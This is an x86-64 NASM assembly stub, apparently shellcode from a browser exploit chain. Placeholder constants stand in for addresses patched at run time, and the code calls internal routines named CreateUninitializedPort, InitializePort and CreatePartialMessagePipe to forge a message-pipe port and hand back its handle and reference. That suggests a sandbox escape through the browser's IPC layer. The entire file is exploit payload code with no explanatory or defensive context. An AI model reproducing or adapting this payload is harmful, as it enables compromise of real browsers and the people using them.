BITS 64

start:
	; int3
	push rbp
	mov rbp, rsp
	sub rsp, 0x8
	push r15
	lea rdi, [rel portref]
	mov rax, 0x4343434343434343 ; initialize PortRef object
	; call rax
	mov rdi, 0x4141414141414141; node
	lea rsi, [rel portref]
	mov rax, 0x4242424242424242; CreateUninitializedPort
	call rax
	mov rax, qword[rel portref]
	mov qword[rel newportname], rax
	mov rax, qword[rel portref+8]
	mov qword[rel newportname+8], rax

	mov rdi, 0x4141414141414141; node
	lea rsi, [rel portref]
	lea rdx, [rel nodename]; Nodename
	lea rcx, [rel portname]; portname
	mov rax, 0x4545454545454545; InitializePort
	call rax	
	
	mov rdi, 0x4646464646464646; core
	lea rsi, [rel portref]
	mov rax, 0x4747474747474747; CreatePartialMessagePipe
	call rax
	pop r15
	mov dword[r15+porthandle-start], eax
	lea rax, [rel portref]
	mov qword[r15+portrefaddr-start], rax
	leave
	ret
nodename:
	dq 0x4848484848484848
	dq 0x4949494949494949
portname:
	dq 0x4a4a4a4a4a4a4a4a
	dq 0x4b4b4b4b4b4b4b4b
newportname:
	dq 0
	dq 0
portrefaddr:
	dq 0
porthandle:
	dd 0
portref:
	times 0x28 db 0
